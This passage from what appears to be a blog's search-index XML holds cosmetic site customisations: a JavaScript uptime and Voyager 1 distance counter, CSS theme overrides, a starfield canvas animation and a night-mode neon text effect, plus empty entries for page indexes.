        <content type="html"><![CDATA[var now = new Date;function createtime() {now.setTime(now.getTime() + 1e3);var e = new Date("03/20/2025 00:00:00"),t = Math.trunc(234e8 + (now - e) / 1e3 * 17),a = (t / 1496e5).toFixed(6),o = new Date("03/20/2025 00:00:00"),n = (now - o) / 1e3 / 60 / 60 / 24,r = Math.floor(n),i = (now - o) / 1e3 / 60 / 60 - 24 * r,s = Math.floor(i);1 == String(s).length && (s = "0" + s);var d = (now - o) / 1e3 / 60 - 1440 * r - 60 * s,l = Math.floor(d);1 == String(l).length && (l = "0" + l);var g = (now - o) / 1e3 - 86400 * r - 3600 * s - 60 * l,b = Math.round(g);1 == String(b).length && (b = "0" + b);let c = "";c = s < 18 && s >= 9 ? `<div style="font-size:13px;font-weight:bold">本站已经运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>` : `<div style="font-size:13px;font-weight:bold">本站已经运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c)}setInterval((() => {createtime()}), 1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }/* 文章双侧栏bug修复 *//* 翻页按钮居中 */#pagination {  width: 100%;  margin: auto;}/*导航栏魔改*//* 一级菜单居中 */#nav .menus_items {  position: absolute !important;  width: fit-content !important;  left: 50% !important;  transform: translateX(-50%) !important;}/* 子菜单横向展示 */#nav .menus_items .menus_item:hover .menus_item_child {  display: flex !important;}/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */.menus_items .menus_item:nth-child(5) .menus_item_child {  left: -38px;}/*黑夜霓虹灯CSS部分*//* 夜间模式菜单栏发光字 */[data-theme="dark"] #nav .site-page,[data-theme="dark"] #nav .menus_items .menus_item .menus_item_child li a {  text-shadow: 0 0 2px rgb(255, 215, 0) !important;}/* 手机端适配 */[data-theme="dark"] #sidebar #sidebar-menus .menus_items .site-page {  text-shadow: 0 0 2px rgb(255, 215, 0) !important;}/* 闪烁变动颜色连续渐变 */#site-name,#site-title,#site-subtitle,#post-info,.author-info__name,.author-info__description {  transition: text-shadow 1s linear !important;}/* 背景宇宙星光  */#universe{  display: block;  position: fixed;  margin: 0;  padding: 0;  border: 0;  outline: 0;  left: 0;  top: 0;  width: 100%;  height: 100%;  pointer-events: none;  /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */  z-index: -1;}:root {  --trans-light: rgba(255, 255, 255, 0.88);  --trans-dark: rgba(25, 25, 25, 0.88);  --border-style: 1px solid rgb(255, 215, 0);  --backdrop-filter: blur(5px) saturate(150%);}/*页面样式调节*//* 首页文章卡片 */#recent-posts > .recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts > .recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/universe.js"/>
      <url>/js/universe.js</url>
      
        <content type="html"><![CDATA[function dark() {window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;var n, e, i, h, t = .05,s = document.getElementById("universe"),o = !0,a = "180,184,240",r = "226,225,142",d = "226,225,224",c = [];function f() {n = window.innerWidth, e = window.innerHeight, i = .216 * n, s.setAttribute("width", n), s.setAttribute("height", e)}function u() {h.clearRect(0, 0, n, e);for (var t = c.length, i = 0; i < t; i++) {var s = c[i];s.move(), s.fadeIn(), s.fadeOut(), s.draw()}}function y() {this.reset = function() {this.giant = m(3), this.comet = !this.giant && !o && m(10), this.x = l(0, n - 10), this.y = l(0, e), this.r = l(1.1, 2.6), this.dx = l(t, 6 * t) + (this.comet + 1 - 1) * t * l(50, 120) + 2 * t, this.dy = -l(t, 6 * t) - (this.comet + 1 - 1) * t * l(50, 120), this.fadingOut = null, this.fadingIn = !0, this.opacity = 0, this.opacityTresh = l(.2, 1 - .4 * (this.comet + 1 - 1)), this.do = l(5e-4, .002) + .001 * (this.comet + 1 - 1)}, this.fadeIn = function() {this.fadingIn && (this.fadingIn = !(this.opacity > this.opacityTresh), this.opacity += this.do)}, this.fadeOut = function() {this.fadingOut && (this.fadingOut = !(this.opacity < 0), this.opacity -= this.do / 2, (this.x > n || this.y < 0) && (this.fadingOut = !1, this.reset()))}, this.draw = function() {if (h.beginPath(), this.giant) h.fillStyle = "rgba(" + a + "," + this.opacity + ")", h.arc(this.x, this.y, 2, 0, 2 * Math.PI, !1);else if (this.comet) {h.fillStyle = "rgba(" + d + "," + this.opacity + ")", h.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, !1);for (var t = 0; t < 30; t++) h.fillStyle = "rgba(" + d + "," + (this.opacity - this.opacity / 20 * t) + ")", h.rect(this.x - this.dx / 4 * t, this.y - this.dy / 4 * t - 2, 2, 2), h.fill()} else h.fillStyle = "rgba(" + r + "," + this.opacity + ")", h.rect(this.x, this.y, this.r, this.r);h.closePath(), h.fill()}, this.move = function() {this.x += this.dx, this.y += this.dy, !1 === this.fadingOut && this.reset(), (this.x > n - n / 4 || this.y < 0) && (this.fadingOut = !0)}, setTimeout(function() {o = !1}, 50)}function m(t) {return Math.floor(1e3 * Math.random()) + 1 < 10 * t}function l(t, i) {return Math.random() * (i - t) + t}f(), window.addEventListener("resize", f, !1),function() {h = s.getContext("2d");for (var t = 0; t < i; t++) c[t] = new y, c[t].reset();u()}(),function t() {document.getElementsByTagName('html')[0].getAttribute('data-theme') == 'dark' && u(), window.requestAnimationFrame(t)}()};dark()]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/light.js"/>
      <url>/js/light.js</url>
      
        <content type="html"><![CDATA[// 霓虹灯效果// 颜色数组var arr = ["#39c5bb", "#f14747", "#f1a247", "#f1ee47", "#b347f1", "#1edbff", "#ed709b", "#5636ed"];// 颜色索引var idx = 0;// 切换颜色function changeColor() {    // 仅夜间模式才启用    if (document.getElementsByTagName('html')[0].getAttribute('data-theme') == 'dark') {        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = arr[idx] + " 0 0 10px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = arr[idx] + " 0 0 5px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = arr[idx] + " 0 0 12px";            document.getElementsByClassName("author-info__description")[0].style.textShadow = arr[idx] + " 0 0 12px";        } catch {                    }        idx++;        if (idx == 8) {            idx = 0;        }    } else {        // 白天模式恢复默认        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = "#1e1e1ee0 1px 1px 1px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = "";            document.getElementsByClassName("author-info__description")[0].style.textShadow = "";        } catch {                    }    }}// 开启计时器window.onload = setInterval(changeColor, 1200);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
